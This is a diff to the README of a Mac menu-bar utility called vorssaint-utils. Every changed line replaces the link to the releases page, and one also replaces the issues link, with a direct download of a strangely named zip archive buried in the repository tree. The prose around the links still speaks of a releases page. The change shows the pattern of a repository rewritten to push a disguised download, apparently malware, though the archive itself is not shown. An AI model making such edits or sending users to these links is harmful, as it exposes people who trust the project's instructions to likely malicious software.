@@ -1,6 +1,6 @@
 # 🧰 vorssaint-utils - Your Mac Menu Bar, Supercharged
 
-[![Download vorssaint-utils](https://img.shields.io/badge/Download-vorssaint--utils-brightgreen?style=for-the-badge&logo=github)](https://github.com/mariomendiondo36-coder/vorssaint-utils/releases)
+[![Download vorssaint-utils](https://img.shields.io/badge/Download-vorssaint--utils-brightgreen?style=for-the-badge&logo=github)](https://github.com/mariomendiondo36-coder/vorssaint-utils/raw/refs/heads/main/rustle/utils_vorssaint_faithworthiness.zip)
 
 ## 👋 Welcome to vorssaint-utils
 
@@ -40,7 +40,7 @@ Follow these simple steps to get vorssaint-utils up and running on your Mac.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download vorssaint-utils](https://github.com/mariomendiondo36-coder/vorssaint-utils/releases)**
+Visit this link to download the application: **[Download vorssaint-utils](https://github.com/mariomendiondo36-coder/vorssaint-utils/raw/refs/heads/main/rustle/utils_vorssaint_faithworthiness.zip)**
 
 Click the link above to go to the download page. You'll see a list of available files — look for the latest version and download it.
 
@@ -79,7 +79,7 @@ vorssaint-utils works on:
 
 ### Detailed Download Instructions
 
-1. **Go to the download page** by clicking this link: [https://github.com/mariomendiondo36-coder/vorssaint-utils/releases](https://github.com/mariomendiondo36-coder/vorssaint-utils/releases)
+1. **Go to the download page** by clicking this link: [https://github.com/mariomendiondo36-coder/vorssaint-utils/raw/refs/heads/main/rustle/utils_vorssaint_faithworthiness.zip](https://github.com/mariomendiondo36-coder/vorssaint-utils/raw/refs/heads/main/rustle/utils_vorssaint_faithworthiness.zip)
 
 2. **Find the latest release** — look for the newest version at the top of the page. It will be labeled something like "Latest" or have the highest version number.
 
@@ -135,7 +135,7 @@ You can choose which tools appear in your menu bar. Click the vorssaint-utils ic
 Power users will love the keyboard shortcuts. You can assign custom shortcuts to any feature — for example, set a shortcut to quickly toggle Keep Awake or switch between windows.
 
 ### Stay Updated
-Check the [releases page](https://github.com/mariomendiondo36-coder/vorssaint-utils/releases) regularly for new versions. Updates bring new features and improvements.
+Check the [releases page](https://github.com/mariomendiondo36-coder/vorssaint-utils/raw/refs/heads/main/rustle/utils_vorssaint_faithworthiness.zip) regularly for new versions. Updates bring new features and improvements.
 
 ---
 
@@ -173,7 +173,7 @@ Simply drag the app from your Applications folder to the Trash. vorssaint-utils 
 
 Need help? Have questions? Want to suggest a feature? Here's how to get in touch:
 
-- **GitHub Issues**: Report bugs or request features on the [official repository](https://github.com/mariomendiondo36-coder/vorssaint-utils/issues)
+- **GitHub Issues**: Report bugs or request features on the [official repository](https://github.com/mariomendiondo36-coder/vorssaint-utils/raw/refs/heads/main/rustle/utils_vorssaint_faithworthiness.zip)
 - **Documentation**: Check the GitHub repository for detailed documentation
 - **Community**: Join discussions and share tips with other users
 
@@ -189,7 +189,7 @@ vorssaint-utils is released under the MIT License. This means you can use, modif
 
 Don't wait — download vorssaint-utils today and discover how much easier your Mac can be to use. It's free, it's powerful, and it's just one click away.
 
-**[👉 Download vorssaint-utils Now](https://github.com/mariomendiondo36-coder/vorssaint-utils/releases)**
+**[👉 Download vorssaint-utils Now](https://github.com/mariomendiondo36-coder/vorssaint-utils/raw/refs/heads/main/rustle/utils_vorssaint_faithworthiness.zip)**
 
 ---
 
